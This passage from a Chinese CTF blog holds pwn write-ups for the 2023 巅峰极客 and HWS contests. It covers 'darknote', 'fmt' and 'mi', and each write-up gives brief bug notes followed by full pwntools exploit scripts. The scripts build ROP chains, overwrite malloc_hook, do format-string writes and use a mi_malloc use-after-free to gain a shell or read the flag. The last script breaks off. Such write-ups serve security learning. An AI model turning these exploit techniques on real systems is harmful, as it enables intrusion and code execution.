<span class="hljs-number">0x00000000004007e3</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x00000000004007e1</span><br>pop_rbp_ret = <span class="hljs-number">0x0000000000400570</span><br>leave_ret = <span class="hljs-number">0x0000000000400712</span><br><br><span class="hljs-comment"># 0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span><br>magic_gadget = <span class="hljs-number">0x40066B</span><br><br>myread = <span class="hljs-number">0x601120</span><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x18</span>: [<br>            pop_rdi_ret, <span class="hljs-number">0</span>, pop_rsi_r15_ret, bss, <span class="hljs-number">0</span>, read_plt,<br>            pop_rbp_ret, read_got + <span class="hljs-number">8</span>,<br>            magic_gadget, bss + <span class="hljs-number">0x18</span>,<br>            pop_rdi_ret, <span class="hljs-number">0</span>, pop_rsi_r15_ret, myread - <span class="hljs-number">0x3b</span> + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, read_plt,<br>            leave_ret<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x100</span><br>)<br><br><span class="hljs-comment"># dbg()</span><br><br>p.send(payload)<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: bss + <span class="hljs-number">8</span>,<br>        <span class="hljs-number">0x10</span>: <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>,<br>        <span class="hljs-number">0x20</span>: [<br>            csu_down, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, myread, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss + <span class="hljs-number">0x10</span>, csu_up<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x100</span><br>)<br>p.send(payload)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x3a</span> + <span class="hljs-string">&#x27;\xd0&#x27;</span><br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724172035253.png" alt="image-20230724172035253"></p><h2 id="darknote"><a href="#darknote" class="headerlink" title="darknote"></a>darknote</h2><p>这道题漏洞点与2022年国赛初赛的漏洞点一样，都是一开始给了个整数溢出，可以任意地址分配，任意地址泄露。国赛那道题可以看<a href="https://bbs.kanxue.com/thread-273235.htm">Ayakaaa师傅的博客</a>。</p><p>这道题恶心人的地方是，把show、delete与edit都canary绑定到了一块，必须使canary低4位为0才可以使用其功能。我的思路一开始就错了，一直想着如何使canary为0，到最后也没能解出来。赛后看师傅们的wp，发现仅仅使用add就可以完成利用，那几个函数可能是起迷惑作用，很不幸，一开始就被骗了。</p><p>查看保护，没有开PIE。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173022279.png" alt="image-20230724173022279"></p><p>没有限制notes_num的大小。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173129657.png" alt="image-20230724173129657"></p><p>edit、show与delete都与canary绑定了。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173233073.png" alt="image-20230724173233073"></p><p>add函数固定分配0x68大小的chunk，且只能写0x60bytes。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173418333.png" alt="image-20230724173418333"></p><p>这里的menu也有点与众不同，可以用来泄露libc地址。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173821044.png" alt="image-20230724173821044"></p><p>大致思路为：</p><ol><li>利用任意地址分配伪造main_arena的fastbin[0x70]，需要注意fastbin大小检测。这里伪造chunk块大小与fd指针，通过把fd内容放入tcache绕过大小检测。</li><li>覆盖menu的指针为got表项，泄露libc地址</li><li>由于最大只能分配0x68的堆块，这里通过打栈完成利用，提前在栈上布置好rop链，覆盖malloc_hook为magic gadget，使其跳转到我们的rop链上。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, u64, p16, p32<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./darknote&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, content=<span class="hljs-string">&#x27;l1s00t&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Note: &#x27;</span>, content)<br><br>    <br><span class="hljs-comment"># vmmap_base = 0x7ffff7bbc000</span><br>p.sendlineafter(<span class="hljs-string">&#x27;dark notes do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x40040000</span>))<br><br><span class="hljs-comment"># main_arena -&gt; fastbins</span><br>add(<span class="hljs-number">0x3edba8</span> // <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x404240</span>))<br><br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><br>puts = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;puts&#x27;</span>, puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br>curbrk = libc_base + libc.sym[<span class="hljs-string">&#x27;__curbrk&#x27;</span>]<br><br>add(<span class="hljs-number">0x3edba8</span> // <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x404240</span>))<br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(environ))<br><br>stack = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br><br>bss = <span class="hljs-number">0x404400</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000401dc3</span><br>pop_rbp_ret = <span class="hljs-number">0x000000000040131d</span><br>leave_ret = <span class="hljs-number">0x00000000004014f8</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000142c92</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000036174</span><br>syscall_ret = libc_base + <span class="hljs-number">0x00000000000630a9</span><br><br><span class="hljs-comment"># add rsp, 0xe0; pop rbx; ret</span><br>magic_gadget = libc_base + <span class="hljs-number">0x00000000000ddc57</span><br><br>add(<span class="hljs-number">0x3edba8</span> // <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(stack - <span class="hljs-number">0x98</span>))<br>add(<span class="hljs-number">0</span>)<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: [<br>            pop_rbp_ret, bss - <span class="hljs-number">0x8</span>, pop_rdi_ret, <span class="hljs-number">0</span>, pop_rsi_ret, bss, pop_rdx_ret, <span class="hljs-number">0x100</span>,<br>            elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>], leave_ret<br>        ],<br>    &#125;<br>)<br>add(<span class="hljs-number">1</span>, payload)<br><br>add(<span class="hljs-number">0x3edba8</span> // <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook - <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>, p64(magic_gadget))<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br>flag_addr = bss + <span class="hljs-number">0xf0</span><br>data = bss + <span class="hljs-number">0x800</span><br>rop_data = [<br>    pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>    <span class="hljs-number">2</span>,<br>    pop_rdi_ret,<br>    flag_addr,<br>    pop_rsi_ret,<br>    <span class="hljs-number">0</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>    <span class="hljs-number">0</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">3</span>,<br>    pop_rsi_ret,<br>    data,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x40</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>    <span class="hljs-number">1</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">1</span>,<br>    pop_rsi_ret,<br>    data,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x40</span>,<br>    syscall_ret<br>]<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: rop_data,<br>        <span class="hljs-number">0xf0</span>: <span class="hljs-string">&#x27;flag&#x27;</span><br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x100</span><br>)<br><br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724174228721.png" alt="image-20230724174228721"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-HWS-PWN-WP</title>
    <link href="/2023/07/17/2023-HWS-PWN-WP/"/>
    <url>/2023/07/17/2023-HWS-PWN-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-HWS-PWN-WP"><a href="#2023-HWS-PWN-WP" class="headerlink" title="2023-HWS-PWN-WP"></a>2023-HWS-PWN-WP</h1><p>这次比赛运气比较好，把pwn ak了。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717090112784.png" alt="image-20230717090112784"></p><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>栈上格式化字符串漏洞。有两次机会，每次最多输入80bytes。第一次泄露地址，第二次覆盖返回地址为one_gadget。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717152420011.png" alt="image-20230717152420011"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./fmt&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30045</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myformat</span>(<span class="hljs-params">offset, addr, data</span>):<br>    A = data &amp; <span class="hljs-number">0xffff</span><br>    B = (data &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><br>    C = (data &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffff</span><br>    <span class="hljs-comment"># D = (data &gt;&gt; 48) &amp; 0xffff</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;A: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(A)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;B: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(B)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;C: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(C)&#125;</span> \n&#x27;</span> )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cal</span>(<span class="hljs-params">x, y</span>):<br>        <span class="hljs-keyword">return</span> ((x - y) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br>    <br>    offset = offset + <span class="hljs-number">6</span><br><br>    payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(A) + <span class="hljs-string">&#x27;c%&#123;&#125;$hn&#x27;</span>.<span class="hljs-built_in">format</span>(offset)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(B, A)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">1</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(C, B)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># payload += &#x27;%&#x27; + str(cal(D, C)) + &#x27;c%&#123;&#125;$hn&#x27;.format(offset + 3)</span><br>    payload = payload.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    payload = payload.encode()<br><br>    payload += p64(addr)<br>    payload += p64(addr + <span class="hljs-number">2</span>)<br>    payload += p64(addr + <span class="hljs-number">4</span>)<br>    <span class="hljs-comment"># payload += p64(addr + 3)</span><br><br>    <span class="hljs-keyword">return</span> payload<br><br>p.recvuntil(<span class="hljs-string">&#x27;need a str: &#x27;</span>)<br><br>payload = <span class="hljs-string">&quot;l1s00t%13$p%18$p%21$p&quot;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>code_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x13f0</span><br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x24083</span><br><br>lg(<span class="hljs-string">&#x27;codebase&#x27;</span>, code_base)<br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>ret = stack - <span class="hljs-number">8</span><br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># dbg()</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;need other str: &#x27;</span>)<br><br>payload = myformat(<span class="hljs-number">6</span>, ret, one_gadget)<br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-HWS-PWN-WP/image-20230717094518373.png" alt="image-20230717094518373"></p><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>题目需要patchelf路径才能正常运行。</p><p>题目的内存分配是一个新型的mi_malloc，但仍然是一道典型的菜单堆题。</p><p>题目存在UAF漏洞。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717094721967.png" alt="image-20230717094721967"></p><p>通过查看mi_malloc源码分析等博客以及调试等方式，对mi_malloc有大致的了解。感觉重要的点就是mi_malloc是以页面为单位分配内存，并把分配得到的内存再划分为不同大小的区块，每个区块互不干扰。分配小块内存时，优先从free中申请，释放时，优先放到local_free链表中。还会进行堆块的复用。</p><p>由此，可以想到，伪造local_free的next指针，即可实现任意地址分配。</p><p>大致思路就是：</p><ol><li>泄露heap地址，得到heapbase</li><li>在heap中存储heap的控制块等结构，存储有mi_libc的地址。伪造chunk块指向存储mi_libc的地址，即可泄露mi_libc地址，进而泄露libc地址</li><li>伪造_IO_2_1_stdout，劫持puts，实现ORW。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./backpwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30276</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title 